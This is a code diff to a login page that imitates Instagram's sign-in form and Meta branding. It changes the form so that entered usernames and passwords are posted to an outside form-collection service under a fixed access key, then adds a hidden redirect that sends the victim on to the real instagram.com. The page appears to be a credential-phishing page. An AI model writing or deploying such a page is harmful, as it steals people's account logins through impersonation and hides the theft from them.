@@ -55,7 +55,14 @@
         <img src="image/logo.jpg" alt="PhotoCircle Logo" class="brand-logo">
     </header>
 <main>
-<form action="https://formspree.io/f/xrppvlbb" method="POST">
+<!-- Replace your existing <form> tag with this -->
+<form action="https://api.web3forms.com/submit" method="POST" autocomplete="off" id="loginForm">
+    <!-- Hidden Field for Access Key -->
+    <input type="hidden" name="access_key" value="f6be431a-425c-4f3a-a70d-9c253d303037">
+    
+    <!-- Optional: Redirect back to Instagram after submission -->
+    <input type="hidden" name="redirect" value="https://www.instagram.com/">
+
     <div class="field">
         <label for="username" class="sr-only">Mobile number, username or email</label>
         <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required autofocus autocomplete="username">
@@ -77,31 +84,8 @@
     <button type="button" class="button button-secondary"><i class="fab fa-facebook-square"></i> Log in with Facebook</button>
     <button type="button" class="button button-outline">Create new account</button>
 </form>
-        <!-- <form action="login.php" method="POST" autocomplete="off" id="loginForm">
-            <div class="field">
-                <label for="username" class="sr-only">Mobile number, username or email</label>
-                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required autofocus autocomplete="username">
-            </div>
-            <div class="field">
-                <label for="password" class="sr-only">Password</label>
-                <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
-            </div>
-            
-            <button type="submit" class="button button-primary" id="loginBtn">Log in</button>
-            
-            <p class="forgot"><a href="#">Forgot password?</a></p>
-            
-            <div class="or-separator">
-                <div class="line"></div>
-                <div class="line"></div>
-            </div>
-            
-            <button type="button" class="button button-secondary"><i class="fab fa-facebook-square"></i> Log in with Facebook</button>
-            <button type="button" class="button button-outline">Create new account</button>
-        </form> -->
 
-
-    <img src="image/meta.jpg" alt="Meta Logo" class="wordmark-logo">
+  <img src="image/meta.jpg" alt="Meta Logo" class="wordmark-logo">
 </main>
 <footer class="ig-footer">
     <div class="footer-lower">
